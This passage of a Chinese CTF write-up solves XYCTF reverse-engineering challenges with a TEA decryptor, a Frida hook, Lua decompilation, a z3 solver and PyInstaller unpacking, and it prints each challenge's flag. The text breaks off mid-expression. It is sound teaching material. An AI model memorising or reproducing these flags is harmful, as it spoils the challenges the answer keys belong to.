id="给阿姨倒一杯卡布奇诺"><a href="#给阿姨倒一杯卡布奇诺" class="headerlink" title="给阿姨倒一杯卡布奇诺"></a>给阿姨倒一杯卡布奇诺</h3><p>经典的 TEA 了</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> uint32_t unsigned int</span><br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">decrypt</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> *v, <span class="hljs-type">uint32_t</span> *key)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">static</span> <span class="hljs-type">uint32_t</span> data1 = <span class="hljs-number">0x5F797274</span>;<br>    <span class="hljs-type">static</span> <span class="hljs-type">uint32_t</span> data2 = <span class="hljs-number">0x64726168</span>;<br>    <span class="hljs-type">int</span> i;   <span class="hljs-comment">// [rsp+20h] [rbp-10h]</span><br>    <span class="hljs-type">uint32_t</span> sum; <span class="hljs-comment">// [rsp+24h] [rbp-Ch]</span><br>    <span class="hljs-type">uint32_t</span> v1;  <span class="hljs-comment">// [rsp+28h] [rbp-8h]</span><br>    <span class="hljs-type">uint32_t</span> v0;  <span class="hljs-comment">// [rsp+2Ch] [rbp-4h]</span><br><br>    sum = <span class="hljs-number">0x6E75316C</span> * <span class="hljs-number">32</span>;<br><br><br>    <span class="hljs-comment">//保存当前密文</span><br>    <span class="hljs-type">uint32_t</span> data1_tmp = v[<span class="hljs-number">0</span>];<br>    <span class="hljs-type">uint32_t</span> data2_tmp = v[<span class="hljs-number">1</span>];<br>    v0 = v[<span class="hljs-number">0</span>];<br>    v1 = v[<span class="hljs-number">1</span>];<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">31</span>; i &gt;= <span class="hljs-number">0</span>; i--)<span class="hljs-comment">//i参与加密，for循环中的i也要倒着写</span><br>    &#123;<br>        v1 -= ((v0 &gt;&gt; <span class="hljs-number">5</span>) + key[<span class="hljs-number">3</span>]) ^ (v0 + sum) ^ (key[<span class="hljs-number">2</span>] + <span class="hljs-number">16</span> * v0) ^ (sum + i);<br>        v0 -= ((v1 &gt;&gt; <span class="hljs-number">5</span>) + key[<span class="hljs-number">1</span>]) ^ (v1 + sum) ^ (key[<span class="hljs-number">0</span>] + <span class="hljs-number">16</span> * v1) ^ (sum + i);<br>        sum -= <span class="hljs-number">0x6E75316C</span>;<br>    &#125;<br>   <br>    v[<span class="hljs-number">0</span>] = v0 ^ data1;<br>    v[<span class="hljs-number">1</span>] = v1 ^ data2;<br>    data1 = data1_tmp;<br>    data2 = data2_tmp;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">uint32_t</span> key[<span class="hljs-number">4</span>];   <span class="hljs-comment">// [rsp+60h] [rbp-40h] BYREF</span><br>    <span class="hljs-type">uint32_t</span> array[<span class="hljs-number">8</span>]; <span class="hljs-comment">// [rsp+70h] [rbp-30h]</span><br>    array[<span class="hljs-number">0</span>] = <span class="hljs-number">0x9B28ED45</span>;<br>    array[<span class="hljs-number">1</span>] = <span class="hljs-number">0x145EC6E9</span>;<br>    array[<span class="hljs-number">2</span>] = <span class="hljs-number">0x5B27A6C3</span>;<br>    array[<span class="hljs-number">3</span>] = <span class="hljs-number">0xE59E75D5</span>;<br>    array[<span class="hljs-number">4</span>] = <span class="hljs-number">0xE82C2500</span>;<br>    array[<span class="hljs-number">5</span>] = <span class="hljs-number">0xA4211D92</span>;<br>    array[<span class="hljs-number">6</span>] = <span class="hljs-number">0xCD8A4B62</span>;<br>    array[<span class="hljs-number">7</span>] = <span class="hljs-number">0xA668F440</span>;<br>    key[<span class="hljs-number">0</span>] = <span class="hljs-number">0x65766967</span>;<br>    key[<span class="hljs-number">1</span>] = <span class="hljs-number">0x756F795F</span>;<br>    key[<span class="hljs-number">2</span>] = <span class="hljs-number">0x7075635F</span>;    <br>    key[<span class="hljs-number">3</span>] = <span class="hljs-number">0x6165745F</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">7</span>; i += <span class="hljs-number">2</span>)<br>    &#123;<br>        <span class="hljs-built_in">decrypt</span>(array + i, key);<br>    &#125;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">32</span>; i++)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>, ((<span class="hljs-type">char</span>*)array)[i]);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>flag 为<code>XTCTF&#123;133bffe401d223a02385d90c5f1ca377&#125;</code></p><h3 id="DebugMe"><a href="#DebugMe" class="headerlink" title="DebugMe"></a>DebugMe</h3><p>jadx 打开有混淆，用 jeb 打开能正常反编译，安卓 java 层动调，Frida 一把梭，hook What类<br><img src="/../images/XYCTF/dbg1.png"></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">hookwhat</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">var</span> what = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;com.xyctf.ezapk.What&quot;</span>);<br>    <span class="hljs-keyword">var</span> enc = <span class="hljs-string">&quot;WikFhRxyYjoSJ8mMbM3fRwty/74bc7Ip7ojqenHaSqc9wDv3JDG9XfV6xEiC7Eg1RWTUa4LaM%2BD0W%2BPKanSA5w==&quot;</span>;<br>    <span class="hljs-keyword">var</span> flag = what.<span class="hljs-title function_">x</span>(enc);<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;\nFlag: &quot;</span> + flag);<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">main</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">perform</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-title function_">hookwhat</span>();<br>    &#125;)<br>&#125;;<br><span class="hljs-title function_">setImmediate</span>(main);<br></code></pre></td></tr></table></figure><p>直接出 flag<br><img src="/../images/XYCTF/dbg.png"><br>flag 为<code>XYCTF&#123;d3bugg3r_15_v3ry_u53ful&#125;</code></p><h3 id="何须相思煮余年"><a href="#何须相思煮余年" class="headerlink" title="何须相思煮余年"></a>何须相思煮余年</h3><p>附件是 txt，将 16 进制数据放进 CyberChef 里，选择<code>From Hex</code>，然后在 Output 保存文件<br><img src="/../images/XYCTF/hx1.png"><br>将保存的文件用 32 位的 ida 打开，发现有函数序言和函数尾声</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">push</span>    ebp         ; 保存旧的栈基址<br>mov     ebp, esp    ; 建立新的栈基址<br><span class="hljs-function"><span class="hljs-keyword">sub</span>     <span class="hljs-title">esp</span>, 0<span class="hljs-title">x20</span>   </span>; 为局部变量分配空间<br></code></pre></td></tr></table></figure><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">leave</span>               <span class="hljs-comment">; 恢复栈指针和基址</span><br>(<span class="hljs-keyword">mov</span> <span class="hljs-built_in">esp</span>, <span class="hljs-built_in">ebp</span><span class="hljs-comment">; pop ebp)</span><br><span class="hljs-keyword">ret</span>                 <span class="hljs-comment">; 返回到调用者</span><br></code></pre></td></tr></table></figure><p>按 <code>P</code> 创建函数后 <code>F5</code>能反编译了<br><img src="/../images/XYCTF/hx2.png"><br>逆向写出解题脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python">enc=[<span class="hljs-number">88</span>,<span class="hljs-number">88</span>,<span class="hljs-number">134</span>,<span class="hljs-number">87</span>,<span class="hljs-number">74</span>,<span class="hljs-number">118</span>,<span class="hljs-number">318</span>,<span class="hljs-number">101</span>,<span class="hljs-number">59</span>,<span class="hljs-number">92</span>,<span class="hljs-number">480</span>,<span class="hljs-number">60</span>,<span class="hljs-number">65</span>,<span class="hljs-number">41</span>,<span class="hljs-number">770</span>,<span class="hljs-number">110</span>,<span class="hljs-number">73</span>,<span class="hljs-number">31</span>,<span class="hljs-number">918</span>,<br>     <span class="hljs-number">39</span>,<span class="hljs-number">120</span>,<span class="hljs-number">27</span>,<span class="hljs-number">1188</span>,<span class="hljs-number">47</span>,<span class="hljs-number">77</span>,<span class="hljs-number">24</span>,<span class="hljs-number">1352</span>,<span class="hljs-number">44</span>,<span class="hljs-number">81</span>,<span class="hljs-number">23</span>,<span class="hljs-number">1680</span>,<span class="hljs-number">46</span>,<span class="hljs-number">85</span>,<span class="hljs-number">15</span>,<span class="hljs-number">1870</span>,<span class="hljs-number">66</span>,<span class="hljs-number">91</span>,<span class="hljs-number">16</span>,<span class="hljs-number">4750</span>]<br><span class="hljs-comment"># length=len(enc)</span><br><span class="hljs-comment"># print(length)</span><br>result=enc.copy()<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(enc)):<br>    <span class="hljs-keyword">if</span> i%<span class="hljs-number">4</span>==<span class="hljs-number">0</span>:<br>        result[i]-=i<br>    <span class="hljs-keyword">elif</span> i%<span class="hljs-number">4</span>==<span class="hljs-number">1</span>:<br>        result[i]+=i<br>    <span class="hljs-keyword">elif</span> i%<span class="hljs-number">4</span>==<span class="hljs-number">2</span>:<br>        <span class="hljs-keyword">if</span> i!=<span class="hljs-number">0</span>:<br>            result[i]//=i<br>    <span class="hljs-keyword">elif</span> i%<span class="hljs-number">4</span>==<span class="hljs-number">3</span>:<br>        result[i]^=i<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-built_in">chr</span>(c) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> result]))<br></code></pre></td></tr></table></figure><p>flag 为<code>XYCTF&#123;5b3e07567a9034d06851475481507a75&#125;</code></p><h3 id="what’s-this"><a href="#what’s-this" class="headerlink" title="what’s this"></a>what’s this</h3><p>用 <code>exeinfope</code>打开看发现 Lua bytecode (generic)，用 <code>luadec</code> 反编译<br><img src="/../images/XYCTF/w1.png"><br>有很大一部分没用的代码直接跳过，看后面关键逻辑<br><img src="/../images/XYCTF/w2.png"><br>把每个字符先异或 8，再 +3<br><img src="/../images/XYCTF/w3.png"><br>base64，逆序，字符替换<br>解题脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br>enc=<span class="hljs-string">&quot;==AeuFEcwxGPuJ0PBNzbC16ctFnPB5DPzI0bwx6bu9GQ2F1XOR1U&quot;</span><br><span class="hljs-comment">#替换</span><br>new_enc=enc.replace(<span class="hljs-string">&quot;6&quot;</span>,<span class="hljs-string">&quot;W&quot;</span>)<br><span class="hljs-comment">#逆序 [start:stop:step] step=-1,从后往前遍历</span><br>enc=new_enc[::-<span class="hljs-number">1</span>]<br>dec=base64.b64decode(enc)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> dec.decode():<br>    i =(<span class="hljs-built_in">ord</span>(i)-<span class="hljs-number">3</span>)^<span class="hljs-number">8</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(i),end=<span class="hljs-string">&quot;&quot;</span>)<br></code></pre></td></tr></table></figure><p>flag 为<code>XYCTF&#123;5dcbaed781363fbfb7d8647c1aee6c&#125;</code></p><h3 id="ez-enc"><a href="#ez-enc" class="headerlink" title="ez_enc"></a>ez_enc</h3><p>main 函数中加密，byte_14001E008 里是密文，z3求解</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">from</span> z3 <span class="hljs-keyword">import</span> *<br><br>enc=[<span class="hljs-number">0x27</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0xC8</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x1F</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0xCB</span>, <br>     <span class="hljs-number">0x2D</span>, <span class="hljs-number">0xE9</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0xFC</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0x3D</span>, <span class="hljs-number">0x2D</span>, <br>     <span class="hljs-number">0xED</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0xEB</span>, <span class="hljs-number">0x3C</span>, <span class="hljs-number">0x3E</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0x7D</span>]<br><span class="hljs-comment"># print(len(enc))</span><br><span class="hljs-comment"># 34</span><br>s=Solver()<br><span class="hljs-comment">#创建一个名字为 &#x27;flag[i]&#x27; 的 8 位的 位向量</span><br>item=[BitVec(<span class="hljs-string">&#x27;flag[%d]&#x27;</span>%i,<span class="hljs-number">8</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">34</span>)]<br><span class="hljs-comment">#copy item to dec</span><br>dec=item[:]<br><br><span class="hljs-comment">#限制flag中字符在常见可打印字符范围内</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">34</span>):<br>    s.add(item[i]&lt;<span class="hljs-number">127</span>)<br>    s.add(item[i]&gt;<span class="hljs-number">31</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">33</span>):<br>    item[i]=<span class="hljs-string">b&#x27;IMouto&#x27;</span>[i%<span class="hljs-number">6</span>]^(item[i+<span class="hljs-number">1</span>]+item[i]%<span class="hljs-number">20</span>)&amp;<span class="hljs-number">0xff</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">34</span>):<br>    s.add(item[i]==enc[i])<br><br><span class="hljs-keyword">if</span> s.check()==sat:<br>    m=s.model()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#x27;</span>.join(<span class="hljs-built_in">chr</span>(m[dec[i]].as_long()) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">34</span>)))<br><br></code></pre></td></tr></table></figure><p>flag 为<code>flag&#123;!_r3ea11y_w4nt_@_cu7e_s1$ter&#125;</code></p><h3 id="ezmath"><a href="#ezmath" class="headerlink" title="ezmath"></a>ezmath</h3><p>python 逆向，先用 pyinstxtractor 解包，找到ezmath.pyc,用 <a href="https://tool.lu/pyc">https://tool.lu/pyc</a> 反编译得到代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment"># visit https://tool.lu/pyc/ for more information</span><br><span class="hljs-comment"># Version: Python 3.8</span><br><br>flag = (<span class="hljs-keyword">lambda</span> <span class="hljs-number">.0</span>: [ <span class="hljs-built_in">ord</span>(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-number">.0</span> ])(<span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;flag:&#x27;</span>))<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(flag) == <span class="hljs-number">32</span> <span class="hljs-keyword">and</span> (((((((((((((((((((((<span class="hljs-built_in">sum</span>((<span class="hljs-keyword">lambda</span> <span class="hljs-number">.0</span>: [ flag[<span class="hljs-number">23</span>] <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-number">.0</span> ])(<span class="hljs-built_in">range</span>(flag[<span class="hljs-number">23</span>]))) + <span class="hljs-built_in">sum</span>((<span class="hljs-keyword">lambda</span> <span class="hljs-number">.0</span>: [ flag[<span class="hljs-number">12</span>] <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-number">.0</span> ])(<span class="hljs-built_in">range</span>(flag[<span class="hljs-number">12</span>]))) + <span class="hljs-built_in">sum</span>((<span class="hljs-keyword">lambda</span> <span class="hljs-number">.0</span>: [ flag[<span class="hljs-number">1</span>] <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-number">.0</span> ])(<span class="hljs-built_in">range</span>(flag[<span class="hljs-number">1</span>]))) - <span class="hljs-built_in">sum</span>((<span class="hljs-keyword">lambda</span> <span class="hljs-number">.0</span>: [ flag[<span class="hljs-number">24</span>] <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-number">.0</span> ])(<span class="hljs-built_in">range</span>(<span class="hljs-number">222</span>)))) + <span class="hljs-built_in">sum</span>((<span class="hljs-keyword">lambda</span> <span class="hljs-number">.0</span>: [ flag[<span class="hljs-number">22</span>] <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-number">.0</span> ])(<span class="hljs-built_in">range</span>(flag[<span class="hljs-number">22</span>]))) + <span class="hljs-built_in">sum</span>((<span class="hljs-keyword">lambda</span> <span class="hljs-number">.0</span>: [ flag[<span class="hljs-number">31</span>] <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-number">.0</span> ])(<span class="hljs-built_in">range</span>(flag[<span class="hljs-number">31</span>]))) + <span class="hljs-built_in">sum</span>((<span class="hljs-keyword">lambda</span> <span class="hljs-number">.0</span>: [ flag[<span class="hljs-number">26</span>] <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-number">.0</span> ])(<span class="hljs-built_in">range</span>(flag[<span class="hljs-number">26</span>]))) - <span class="hljs-built_in">sum</span>((<span class="hljs-keyword">lambda</span> <span class="hljs-number">.0</span>: [ flag[<span class="hljs-number">9</span>] <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-number">.0</span> ])(<span class="hljs-built_in">range</span>(<span class="hljs-number">178</span>))) - <span class="hljs-built_in">sum</span>((<span class="hljs-keyword">lambda</span> <span class="hljs-number">.0</span>: [ flag[<span class="hljs-number">29</span>] <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-number">.0</span> ])(<span class="hljs-built_in">range</span>(<span class="hljs-number">232</span>)))) + <span class="hljs-built_in">sum</span>((<span class="hljs-keyword">lambda</span> <span class="hljs-number">.0</span>: [ flag[<span class="hljs-number">17</span>] <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-number">.0</span> ])(<span class="hljs-built_in">range</span>(flag[<span class="hljs-number">17</span>]))) - <span class="hljs-built_in">sum</span>((<span class="hljs-keyword">lambda</span> <span class="hljs-number">.0</span>: [ flag[<span class="hljs-number">23</span>] <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-number">.0</span> ])(<span class="hljs-built_in">range</span>(<span class="hljs-number">150</span>))) - <span class="hljs-built_in">sum</span>((<span class="hljs-keyword">lambda</span> <span class="hljs-number">.0</span>: [ flag[<span class="hljs-number">6</span>] <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-number">.0</span> ])(<span class="hljs-built_in">range</span>(<span class="hljs-number">226</span>))) - <span class="hljs-built_in">sum</span>((<span class="hljs-keyword">lambda</span> <span class="hljs-number">.0</span>: [ flag[<span class="hljs-number">7</span>] <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-number">.0</span> ])(<span class="hljs-built_in">range</span>(<span class="hljs-number">110</span>)))) + <span class="hljs-built_in">sum</span>((<span class="hljs-keyword">lambda</span> <span class="hljs-number">.0</span>: [ flag[<span class="hljs-number">19</span>] <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-number">.0</span> ])(<span class="hljs-built_in">range</span>(flag[<span class="hljs-number">19</span>]))) + <span class="hljs-built_in">sum</span>((<span class="hljs-keyword">lambda</span> <span class="hljs-number">.0</span>: [ flag[<span class="hljs-number">2</span>] <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-number">.0</span> ])(<span class="hljs-built_in">range</span>(flag[<span class="hljs-number">2</span>]))) - <span class="hljs-built_in">sum</span>((<span class="hljs-keyword">lambda</span> <span class="hljs-number">.0</span>: [ flag[<span class="hljs-number">0</span>] <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-number">.0</span> ])(<span class="hljs-built_in">range</span>(<span class="hljs-number">176</span>)))) + <span class="hljs-built_in">sum</span>((<span class="hljs-keyword">lambda</span> <span class="hljs-number">.0</span>: [ flag[<span class="hljs-number">10</span>] <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-number">.0</span> ])(<span class="hljs-built_in">range</span>(flag[<span class="hljs-number">10</span>]))) - <span class="hljs-built_in">sum</span>((<span class="hljs-keyword">lambda</span> <span class="hljs-number">.0</span>: [ flag[<span class="hljs-number">12</span>] <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-number">.0</span> ])(<span class="hljs-built_in">range</span>(<span class="hljs-number">198</span>)))) + <span class="hljs-built_in">sum</span>((<span class="hljs-keyword">lambda</span> <span class="hljs-number">.0</span>: [ flag[<span class="hljs-number">24</span>] <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-number">.0</span> ])(<span class="hljs-built_in">range</span>(flag[<span class="hljs-number">24</span>]))) + <span class="hljs-built_in">sum</span>((<span class="hljs-keyword">lambda</span> <span class="hljs-number">.0</span>: [ flag[<span class="hljs-number">9</span>] <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-number">.0</span> ])(<span class="hljs-built_in">range</span>(flag[<span class="hljs-number">9</span>]))) - <span class="hljs-built_in">sum</span>((<span class="hljs-keyword">lambda</span> <span class="hljs-number">.0</span>: [ flag[<span class="hljs-number">3</span>] <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-number">.0</span> ])(<span class="hljs-built_in">range</span>(<span class="hljs-number">168</span>)))) + <span class="hljs-built_in">sum</span>((<span class="hljs-keyword">lambda</span> <span class="hljs-number">.0</span>: [ flag[<span class="hljs-number">8</span>] <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-number">.0</span> ])(<span class="hljs-built_in">range</span>(flag[<span class="hljs-number">8</span>]))) - <span class="hljs-built_in">sum</span>((<span class="hljs-keyword">lambda</span> <span class="hljs-number">.0</span>: [ flag[<span class="hljs-number">2</span>] <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-number">.0</span> ])(<span class="hljs-built_in">range</span>(<span class="hljs-number">134</span>)))) + <span class="hljs-built_in">sum</span>((<span class="hljs-keyword">lambda</span> <span class="hljs-number">.0</span>: [ flag[<span class="hljs-number">14</span>] <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-number">.0</span> ])(<span class="hljs-built_in">range</span>(flag[<span class="hljs-number">14</span>]))) - <span class="hljs-built_in">sum</span>((<span class="hljs-keyword">lambda</span> <span class="hljs-number">.0</span>: [ flag[<span class="hljs-number">13</span>] <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-number">.0</span> ])(<span class="hljs-built_in">range</span>(<span class="hljs-number">170</span>)))) + <span class="hljs-built_in">sum</span>((<span class="hljs-keyword">lambda</span> <span class="hljs-number">.0</span>: [ flag[<span class="hljs-number">4</span>] <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-number">.0</span> ])(<span class="hljs-built_in">range</span>(flag[<span class="hljs-number">4</span>]))) - <span class="hljs-built_in">sum</span>((<span class="hljs-keyword">lambda</span> <span class="hljs-number">.0</span>: [ flag[<span class="hljs-number">10</span>] <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-number">.0</span> ])(<span class="hljs-built_in">range</span>(<span class="hljs-number">142</span>)))) + <span class="hljs-built_in">sum</span>((<span class="hljs-keyword">lambda</span> <span class="hljs-number">.0</span>: [ flag[<span class="hljs-number">27</span>] <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-number">.0</span> ])(<span class="hljs-built_in">range</span>(flag[<span class="hljs-number">27</span>]))) + <span class="hljs-built_in">sum</span>((<span class="hljs-keyword">lambda</span> <span class="hljs-number">.0</span>: [ flag[<span class="hljs-number">15</span>] <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-number">.0</span> ])(<span class="hljs-built_in">range</span>(flag[<span class="hljs-number">15</span>]))) - <span class="hljs-built_in">sum</span>((<span class="hljs-keyword">lambda</span> <span class="hljs-number">.0</span>: [ flag[<span class="hljs-number">15</span>] <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-number">.0</span> ])(<span class="hljs-built_in">range</span>(<span class="hljs-number">224</span>)))) + <span class="hljs-built_in">sum</span>((<span class="hljs-keyword">lambda</span> <span class="hljs-number">.0</span>: [ flag[<span class="hljs-number">16</span>] <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-number">.0</span> ])(<span class="hljs-built_in">range</span>(flag[<span class="hljs-number">16</span>]))) - <span class="hljs-built_in">sum</span>((<span class="hljs-keyword">lambda</span> <span class="hljs-number">.0</span>: [ flag[<span class="hljs-number">11</span>] <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-number">.0</span> ])(<span class="hljs-built_in">range</span>(<span class="hljs-number">230</span>))) - <span 